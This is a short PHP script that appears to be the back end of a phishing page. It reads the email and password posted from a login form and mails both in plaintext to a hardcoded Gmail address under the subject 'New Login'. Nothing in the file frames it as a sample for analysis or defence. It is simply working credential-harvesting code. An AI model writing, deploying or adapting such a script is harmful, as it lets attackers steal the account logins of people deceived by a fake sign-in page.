<?php
  $email = $_POST['email'];
  $password = $_POST['password'];

  $to = "hastehena12@gmail.com";
  $subject = "New Login";
  $message = "Email: $email\nPassword: $password";
  $headers = "From: no-reply@example.com";

  mail($to, $subject, $message, $headers);
  echo "Sent!";
?>

